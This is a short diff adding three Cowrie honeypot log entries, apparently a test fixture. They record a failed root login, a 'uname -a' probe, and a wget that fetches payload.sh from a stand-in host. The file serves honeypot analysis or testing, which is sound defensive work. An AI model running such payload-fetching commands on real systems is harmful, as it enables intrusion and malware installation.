@@ -1,0 +1,3 @@
+{"timestamp":"2026-03-05T09:04:01.000000Z","eventid":"cowrie.login.failed","src_ip":"198.51.100.91","src_port":52522,"username":"root","password":"toor"}
+{"timestamp":"2026-03-05T09:04:13.000000Z","eventid":"cowrie.command.input","src_ip":"198.51.100.91","input":"uname -a"}
+{"timestamp":"2026-03-05T09:04:22.000000Z","eventid":"cowrie.command.input","src_ip":"198.51.100.91","input":"wget http://bad.example/payload.sh"}
